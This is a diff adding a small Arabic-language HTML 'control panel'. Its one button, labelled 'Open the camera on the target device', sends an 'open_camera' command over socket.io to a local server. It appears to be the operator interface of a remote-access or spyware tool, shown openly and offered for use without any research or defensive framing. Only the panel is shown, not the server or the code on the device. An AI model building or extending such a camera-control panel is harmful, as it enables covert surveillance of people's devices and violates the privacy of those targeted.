@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+        button { padding: 15px 30px; font-size: 18px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+    <h1>مرحباً بك في لوحة التحكم</h1>
+    <button onclick="sendCommand()">افتح الكاميرا في الجهاز الهدف</button>
+
+    <script>
+        // الاتصال بنفس السيرفر
+        const socket = io("http://localhost:3000");
+
+        function sendCommand() {
+            // إرسال أمر فتح الكاميرا للسيرفر
+            socket.emit('send_command', 'open_camera');
+            alert('تم إرسال الأمر!');
+        }
+    </script>
+</body>
+</html>
